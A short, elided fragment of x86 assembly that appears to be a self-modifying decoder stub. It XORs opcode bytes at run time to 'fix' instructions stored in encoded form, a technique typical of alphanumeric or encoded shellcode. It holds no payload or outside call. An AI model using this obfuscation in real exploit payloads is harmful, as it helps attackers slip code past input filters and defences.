...
; one of these bytes as well:
	...
	XOR     [BYTE ECX+inc1], ESI        ; Fix INC opcode
	XOR     [BYTE ECX+data], ESI        ; Fix data
esi_value equ 1
; 
...
loop:
imul1:    db 0x6B, 0x44^code, 0x71, offset_esi2, 0x30 ; IMUL    EAX,DWORD PTR DS:[ECX+ESI*2+X],30
  XOR     AH, [BYTE ECX+ESI*2+offset_esi2]
inc1:     db 0x46^code                                ; INC     ESI
  XOR     [BYTE ECX+ESI+offset_esi-1], AH
